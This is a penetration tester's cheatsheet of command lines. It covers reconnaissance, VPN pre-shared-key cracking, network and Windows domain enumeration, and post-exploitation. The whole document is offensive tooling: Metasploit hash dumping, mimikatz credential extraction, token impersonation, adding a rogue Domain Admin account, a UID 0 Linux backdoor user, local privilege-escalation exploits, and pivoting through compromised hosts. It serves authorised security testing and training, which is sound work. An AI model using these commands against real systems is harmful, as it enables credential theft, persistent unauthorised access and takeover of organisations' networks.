Penetration Testing Cheatsheet
------------------------------

[+] Reminders

LOG EVERYTHING!

Metasploit - spool /home/<username>/console.log
Linux Terminal - script /home/<username>/Engagements/TestOutput.txt  #Type exit to stop

Set IP address
ifconfig eth0 192.168.50.12/24

Set default gateway
route add default gw 192.168.50.9

Set DNS servers
echo "nameserver 192.168.100.2" >> /etc/resolv.conf

Show routing table
Windows - route print
Linux   - route -n

Add static route
Linux - route add -net 192.168.100.0/24 gw 192.16.50.9
Windows - route add 0.0.0.0 mask 0.0.0.0 192.168.50.9

Subnetting easy mode
ipcalc 192.168.0.1 255.255.255.0


[+] External Infrastructure Testing - Information Gathering

WHOIS Querying
whois www.domain.com

Resolve an IP using DIG
host www.google.com 8.8.8.8

Find Mail servers for a domain
host -t mx www.gmail.com 8.8.8.8

Find any DNS records for a domain
host -t any www.google.com 8.8.8.8

Zone Transfer
host -l securitymuppets.com 192.168.100.2

Metasploit Auxiliarys
auxiliary/gather/enum_dns

Fierce
fierce -dns <domain> -wordlist <wordlist>


[+] External Infrastructure Testing - VPN Testing

ike-scan
ike-scan 192.168.207.134
sudo ike-scan -A 192.168.207.134
sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key

pskcrack
psk-crack -b 5 192-168-207-134key
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary 192-168-207-134key


[+] Internal Infrastructure Testing - Network Enumeration

DHCP Information - Use ipconfig /all to obtain useful information.

Network Sniffing (Wireshark, tshark, tcpdump)
Sniffing is a great passive method for mapping networks and systems. Typically, you’ll see a lot of broadcast traffic such as DNS, NBNS, BROWSER, and Cisco protocols that reveal hostnames, active subnets, VLANS, and domain names.

Net view
net view /ALL /Domain:clientdomain.com

ARP Scan
arp-scan 192.168.50.8/28 -I eth0

Nmap ping scan
sudo nmap –sn -oA nmap_pingscan 192.168.100.0/24

Nmap SYN/Top 100 ports Scan
nmap -sS -F -oA nmap_fastscan 192.168.0.1/24

Nmap all port version scan
sudo nmap -sTV -p0- -A --stats-every 10s --reason --min-rate 1000 -oA nmap_scan 192.168.0.1/24

Nmap UDP all port scan
sudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24

Nmap source port scanning
nmap -g <port> (88 (Kerberos) port 53 (DNS) or 67 (DHCP))

Hping3 scanning
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
Open = flags = SA
Closed = Flags = RA
Blocked = ICMP unreachable
Dropped = No response


[+] Internal Infrastructure Testing - Windows Domain Enumeration

Obtain domain information using windows
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

DNS Lookup
nslookup -type=SRV _ldap._tcp.

User/Domain enumeration using RDP
rdesktop 172.16.100.141 -u ""

Net Group Command
net group "Domain Controllers" /domain

Netbios enumeration
nbtscan -r 192.168.0.1-100
nbtscan -f hostfiles.txt

enum4linux

RID cycling
use auxiliary/scanner/smb/smb_lookupsid
ridenum

Net Users
net users /domain

Null session in windows
net use \\192.168.0.1\IPC$ "" /u:""

Null session in linux
smbclient -L //192.168.99.131

nbtscan
nbtscan -r 10.0.2.0/24

Sharepoint User Profile Page
Find SharePoint servers with nmap, Nessus etc.

Net Accounts - Obtain Password Policy
net accounts


[+] Internal Infrastructure Testing - Quick Domain Administrator Compromise

Compromise machine via missing Microsoft patch, weak credentials or credentials found via Responder.

From Shell - net group "Domain Admins" /domain

Dump the hashes (Metasploit)
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE

Find the admins (Metasploit)
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run
msf> spool off

Compromise the administrator's machine
meterpreter > load mimikatz
meterpreter > wdigest

or

meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > getuid
meterpreter > shell

C:\> whoami
mydom\adaministrator
C:\> net user hacker /add /domain
C:\> net group "Domain Admins" hacker /add /domain


[+] Internal Infrastructure Testing - Post Exploitation

Meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ipconfig
meterpreter> run post/windows/gather/checkvm
meterpreter> run get_local_subnets

Privilege Escalation (If Required)
run post/windows/escalate/getsystem
use post/windows/escalate/droplnk
use exploit/windows/local/bypassuac
use exploit/windows/local/service_permissions
use exploit/windows/local/trusted_service_path
use exploit/windows/local/ppr_flatten_rec
use exploit/windows/local/ms_ndproxy
use exploit/windows/local/ask

meterpreter> run getcountermeasure
meterpreter> run winenum
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> run post/windows/gather/credentials/sso
meterpreter> run post/windows/gather/cachedump
meterpreter> run post/windows/gather/lsa_secrets
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> run post/windows/gather/enum_ad_computers
meterpreter> run post/windows/gather/win_privs
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > run post/windows/gather/usb_history
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/enum_snmp

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker password1 -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10

meterpreter > load mimikatz
meterpreter > wdigest

Find Group Policy Preference XML files:
C:>findstr /S cpassword %logonserver%\sysvol\*.xml
meterpreter > post/windows/gather/credentials/gpp

Dump remote SAM:
meterpreter> run post/windows/gather/smart_hashdump

Add Windows User
net user username password /ADD
net localgroup Administrators username /ADD

net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

Windows Information via Command Prompt
ipconfig /all
systeminfo
net localgroup administrators
net view
net view /domain
net accounts /domain
net group "Domain Admins" /domain

python-impact
psexec.py
secretsdump.py

Kitrap0d
Download vdmallowed.exe and vdmexploit.dll to victim
Run vdmallowed.exe to execute system shell
Add Linux User
/usr/sbin/useradd –g 0 –u 0 –o user
echo user:password | /usr/sbin/chpasswd

Solaris Commands
useradd -o user
passwd user
usermod -R root user

SSH Tunnelling
Remote forward port 222
ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118


[+] Pivoting - Lateral Movement

meterpreter> run arp_scanner -r 10.10.10.0/24
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/scanner/portscan/tcp

autoroute:
meterpreter > ipconfig
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > getsystem
meterpreter > run hashdump
use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > use exploit/windows/smb/psexec 

port forwarding:
meterpreter > run autoroute -s 10.1.13.0/24
use auxiliary/scanner/portscan/tcp
meterpreter > portfwd add -l <listening port> -p <remote port> -r <remote/internal host>

socks proxy:
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/server/socks4a
Add proxy to /etc/proxychains.conf
proxychains nmap -sT -T4 -Pn 10.10.10.50
setg socks4:127.0.0.1:1080


[+] Internal/External Infrastructure Testing - Service Enumeration

Finger - Enumerate Users
------------------------
finger @192.168.0.1
finger -l -p user@ip-address
Metasploit - auxiliary/scanner/finger/finger_users

NTP
---
Metasploit auxiliarys

SNMP
----
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
Metasploit Module snmp_enum
snmpcheck -t snmpservice

RSERVICES
---------
rwho 192.168.0.1
rlogin -l root 192.168.0.17

RPC Services
------------
rpcinfo -p
Endpoint_mapper metasploit

NFS
---
showmount -e 192.168.0.10
mount 192.168.0.10:/secret /mnt/share/
Metasploit - auxiliary/scanner/nfs/nfsmount
rpcinfo -p 192.168.0.10

LDAP
----
Tools:
ldapsearch
LDAPExplorertool2

ldapsearch -h <ip> -p 389 -x -s base

Anonymous Bind:
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"

Authenticated:
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W

SMTP
----
ncat -C mail.host.com 25

EHLO hostname
MAIL FROM: test@host.com
RCPT TO:   www@host.com
DATA
From: A tester <test@host.com>
To:   <www@host.com>
Date: date
Subject: A test message from hostname

Delete me, please
.
QUIT
